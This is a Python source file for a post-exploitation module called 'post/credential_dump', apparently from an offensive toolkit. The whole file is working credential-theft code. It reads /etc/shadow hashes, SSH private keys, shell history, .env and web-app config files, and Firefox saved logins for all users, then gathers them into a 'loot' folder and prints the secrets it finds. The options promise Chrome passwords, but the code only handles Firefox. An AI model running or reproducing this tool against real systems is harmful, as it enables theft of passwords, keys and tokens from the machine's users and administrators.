import os
import subprocess
import glob
import json
import base64
import sqlite3
import shutil
import tempfile
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'post/credential_dump',
        'description': 'Dump /etc/shadow, SSH keys, bash history, browser saved passwords, and .env files.',
        'options': {
            'OUTPUT_DIR': 'Directory to save dumped credentials [default: loot/creds/]',
            'TARGET_USER': 'Target home directory username (or ALL for all users) [default: ALL]',
            'DUMP_SHADOW': 'Dump /etc/shadow if readable [default: true]',
            'DUMP_SSH': 'Dump SSH private keys [default: true]',
            'DUMP_BROWSER': 'Dump browser saved passwords (Chrome/Firefox) [default: true]',
            'DUMP_ENV': 'Search for .env and config files with credentials [default: true]',
            'DUMP_HISTORY': 'Dump shell history files [default: true]',
        }
    }

    def __init__(self, framework):
        self.framework = framework
        self.output_dir = 'loot/creds'

    def _save(self, filename, content):
        path = os.path.join(self.output_dir, filename)
        with open(path, 'w') as f:
            f.write(content)
        console.print(f"  [green][+] Saved: {path}[/green]")
        log_action(f"Credential dump saved: {path}")

    def _dump_shadow(self):
        console.print("\n[cyan][*] Attempting /etc/shadow dump...[/cyan]")
        try:
            with open('/etc/shadow', 'r') as f:
                content = f.read()
            self._save('shadow.txt', content)
            lines = [l for l in content.splitlines() if not l.startswith('!') and l.split(':')[1] not in ('*', '!', '')]
            if lines:
                table = Table(title="Active Hashes from /etc/shadow")
                table.add_column("User", style="cyan")
                table.add_column("Hash", style="yellow")
                for line in lines:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        table.add_row(parts[0], parts[1][:40] + '...' if len(parts[1]) > 40 else parts[1])
                console.print(table)
        except PermissionError:
            console.print("  [yellow][!] /etc/shadow not readable (need root).[/yellow]")
        except FileNotFoundError:
            console.print("  [yellow][!] /etc/shadow not found (non-Linux system?).[/yellow]")

    def _dump_ssh_keys(self, home_dirs):
        console.print("\n[cyan][*] Searching for SSH private keys...[/cyan]")
        found = 0
        for home in home_dirs:
            ssh_dir = os.path.join(home, '.ssh')
            if not os.path.isdir(ssh_dir):
                continue
            for f in os.listdir(ssh_dir):
                fpath = os.path.join(ssh_dir, f)
                if not f.endswith('.pub') and os.path.isfile(fpath):
                    try:
                        with open(fpath, 'r') as fp:
                            content = fp.read()
                        if '-----BEGIN' in content:
                            user = os.path.basename(home)
                            self._save(f'ssh_key_{user}_{f}.txt', content)
                            console.print(f"  [bold green][+] SSH key found: {fpath}[/bold green]")
                            found += 1
                    except Exception:
                        pass
        if not found:
            console.print("  [yellow][!] No SSH keys found.[/yellow]")

    def _dump_history(self, home_dirs):
        console.print("\n[cyan][*] Dumping shell history files...[/cyan]")
        history_files = ['.bash_history', '.zsh_history', '.sh_history', '.history']
        found = 0
        for home in home_dirs:
            user = os.path.basename(home)
            for hf in history_files:
                path = os.path.join(home, hf)
                if os.path.isfile(path):
                    try:
                        with open(path, 'r', errors='ignore') as f:
                            content = f.read()
                        self._save(f'history_{user}_{hf}.txt', content)
                        # Show any lines with passwords
                        interesting = [l for l in content.splitlines()
                                       if any(kw in l.lower() for kw in ['password', 'passwd', 'secret', 'token', 'key', 'curl', 'wget', 'mysql', 'ssh'])]
                        if interesting:
                            console.print(f"  [bold yellow][+] Interesting history lines from {user}:[/bold yellow]")
                            for line in interesting[:10]:
                                console.print(f"    [yellow]{line}[/yellow]")
                        found += 1
                    except Exception:
                        pass
        if not found:
            console.print("  [yellow][!] No history files found.[/yellow]")

    def _dump_env_files(self, home_dirs):
        console.print("\n[cyan][*] Searching for .env and config files...[/cyan]")
        patterns = [
            '**/.env', '**/.env.*', '**/config.ini', '**/config.yml',
            '**/database.php', '**/wp-config.php', '**/*.conf',
            '**/settings.py', '**/application.properties',
        ]
        cred_keywords = ['password', 'passwd', 'secret', 'api_key', 'token', 'db_pass', 'database_url']
        found = 0
        search_roots = home_dirs + ['/var/www', '/opt', '/srv', '/etc']
        for root in search_roots:
            for pat in patterns:
                for match in glob.glob(os.path.join(root, pat), recursive=True)[:5]:
                    try:
                        with open(match, 'r', errors='ignore') as f:
                            content = f.read()
                        lines = [l for l in content.splitlines()
                                 if any(kw in l.lower() for kw in cred_keywords)]
                        if lines:
                            console.print(f"  [bold green][+] Credentials in: {match}[/bold green]")
                            for l in lines[:5]:
                                console.print(f"    [yellow]{l.strip()}[/yellow]")
                            self._save(f'env_{found}.txt', f"# Source: {match}\n" + '\n'.join(lines))
                            found += 1
                    except Exception:
                        pass

        if not found:
            console.print("  [yellow][!] No credential files found.[/yellow]")

    def _dump_firefox(self, home_dirs):
        console.print("\n[cyan][*] Looking for Firefox logins...[/cyan]")
        for home in home_dirs:
            ff_dir = os.path.join(home, '.mozilla', 'firefox')
            if not os.path.isdir(ff_dir):
                continue
            for profile in os.listdir(ff_dir):
                db_path = os.path.join(ff_dir, profile, 'logins.json')
                if os.path.isfile(db_path):
                    try:
                        with open(db_path, 'r') as f:
                            data = json.load(f)
                        console.print(f"  [green][+] Firefox logins.json found: {db_path}[/green]")
                        console.print(f"  [yellow][!] {len(data.get('logins', []))} saved login(s) — passwords are encrypted with NSS (use firepwd to decrypt)[/yellow]")
                        self._save(f'firefox_logins_{os.path.basename(home)}.json', json.dumps(data, indent=2))
                    except Exception:
                        pass

    def run(self):
        self.output_dir = self.framework.options.get('OUTPUT_DIR', 'loot/creds')
        target_user = self.framework.options.get('TARGET_USER', 'ALL')
        do_shadow = self.framework.options.get('DUMP_SHADOW', 'true').lower() == 'true'
        do_ssh = self.framework.options.get('DUMP_SSH', 'true').lower() == 'true'
        do_browser = self.framework.options.get('DUMP_BROWSER', 'true').lower() == 'true'
        do_env = self.framework.options.get('DUMP_ENV', 'true').lower() == 'true'
        do_history = self.framework.options.get('DUMP_HISTORY', 'true').lower() == 'true'

        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        console.print(f"[cyan][*] Credential dump starting → {self.output_dir}[/cyan]")
        log_action(f"Credential dump started to {self.output_dir}")

        # Get home dirs
        if target_user == 'ALL':
            home_dirs = [d for d in glob.glob('/home/*') if os.path.isdir(d)]
            home_dirs.append('/root')
            home_dirs = [d for d in home_dirs if os.path.isdir(d)]
        else:
            home_dirs = [f'/home/{target_user}', '/root'] if target_user == 'root' else [f'/home/{target_user}']
            home_dirs = [d for d in home_dirs if os.path.isdir(d)]

        if do_shadow:
            self._dump_shadow()
        if do_ssh:
            self._dump_ssh_keys(home_dirs)
        if do_history:
            self._dump_history(home_dirs)
        if do_env:
            self._dump_env_files(home_dirs)
        if do_browser:
            self._dump_firefox(home_dirs)

        console.print(f"\n[bold green][+] Credential dump complete. Results in: {self.output_dir}[/bold green]")
